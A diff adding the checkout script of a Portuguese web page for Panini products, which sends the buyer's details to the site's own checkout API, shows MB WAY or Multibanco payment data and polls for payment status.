+  const oldText = btn.textContent;
+  btn.textContent = 'A PROCESSAR…';
+
+  const phone = document.getElementById('fPhone').value.trim();
+  const sanitizedPhone = '+351' + phone;
+  const payload = {
+    amount: totals.total,
+    method: state.method,
+    anonymous: false,
+    name: document.getElementById('fName').value.trim(),
+    email: document.getElementById('fEmail').value.trim(),
+    nif: document.getElementById('fNif').value.trim() || null,
+    phone: sanitizedPhone,
+    eventId: getCheckoutEventId(),
+    fbp: getCookie('_fbp'),
+    fbc: getCookie('_fbc'),
+    sourceUrl: window.location.href,
+    product: {
+      id: 'roleta-cart',
+      name: state.cart.length === 1 ? state.cart[0].name : (totals.itemCount + ' produtos Panini'),
+      qty: totals.itemCount,
+      unitPrice: totals.subFinal / totals.itemCount,
+      items: state.cart.map(c => ({ id:c.id, name:c.name, qty:c.qty, price:c.priceFinal })),
+      upsells: UPSELLS.filter(u => state.upsells[u.id]).map(u => ({ id:u.id, name:u.name, price:u.price })),
+    },
+    shipping: {
+      mode: 'standard',
+      price: 0,
+      address: {
+        cp: document.getElementById('fCp').value.trim(),
+        street: document.getElementById('fAddress').value.trim(),
+        floor: null,
+        city: document.getElementById('fCity').value.trim(),
+        country: 'PT',
+      },
+    },
+    utm: getStoredUtms(),
+  };
+  try{
+    const res = await fetch('/api/checkout',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || 'Falha ao criar pagamento.');
+    state.txId = data.id;
+    showWaiting(data);
+    startPolling(data.id);
+  }catch(err){
+    showFailure(err.message);
+  }finally{
+    btn.disabled = false;
+    btn.textContent = oldText;
+  }
+}
+
+function showOverlay(id){
+  ['screen-waiting','screen-success','screen-failure'].forEach(s => {
+    const el = document.getElementById(s);
+    if (el) el.classList.toggle('hidden', s !== id);
+  });
+}
+function showWaiting(data){
+  const card = document.getElementById('mbRefCard');
+  const title = document.getElementById('waitingTitle');
+  const text = document.getElementById('waitingText');
+  if (data.method === 'mbway'){
+    if (title) title.textContent = 'A AGUARDAR MB WAY';
+    if (text) text.textContent = 'Confirma o pagamento no teu app MB WAY.';
+    if (card) card.classList.add('hidden');
+  } else {
+    if (title) title.textContent = 'USA ESTES DADOS MULTIBANCO';
+    if (text) text.textContent = 'Efetua o pagamento no homebanking ou caixa Multibanco.';
+    if (card) card.classList.remove('hidden');
+    const ref = data.referenceData || {};
+    const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
+    set('mbEntity', ref.entity || '—');
+    set('mbReference', ref.reference || '—');
+    set('mbAmount', fmt(data.amount));
+    set('mbExpires', ref.expiresAt || '—');
+  }
+  showOverlay('screen-waiting');
+}
+function startPolling(id){
+  stopPolling();
+  state.pollTimer = setTimeout(async function poll(){
+    try{
+      const r = await fetch('/api/status/' + id);
+      const d = await r.json();
+      if (d.status === 'COMPLETED'){
+        stopPolling();
+        if (typeof fbq === 'function'){
+          fbq('track','Purchase',{ value: calcTotals().total, currency:'EUR' });
+        }
+        try{ sessionStorage.removeItem('roleta_cart_v1'); }catch(e){}
+        showOverlay('screen-success');
+        return;
+      }
+      if (d.status === 'DECLINED'){ stopPolling(); showFailure('O pagamento foi recusado.'); return; }
+      state.pollTimer = setTimeout(poll, 4000);
+    }catch(e){ state.pollTimer = setTimeout(poll, 6000); }
+  }, 3000);
+}
+function stopPolling(){ if (state.pollTimer){ clearTimeout(state.pollTimer); state.pollTimer = null; } }
+function showFailure(msg){
+  stopPolling();
+  const m = document.getElementById('failureMsg');
+  if (m && msg) m.textContent = msg;
+  showOverlay('screen-failure');
+}
+
+document.getElementById('btnPay').addEventListener('click', processPayment);
+document.getElementById('btnRetry').addEventListener('click', () => {
+  document.querySelectorAll('.overlay').forEach(o => o.classList.add('hidden'));
+});
+
+/* === INIT === */
+loadCart();
+renderCart();
+renderUpsells();
+
+trackEvt('checkout_view', { items: state.cart.length });
+</script>
+</body>
+</html>
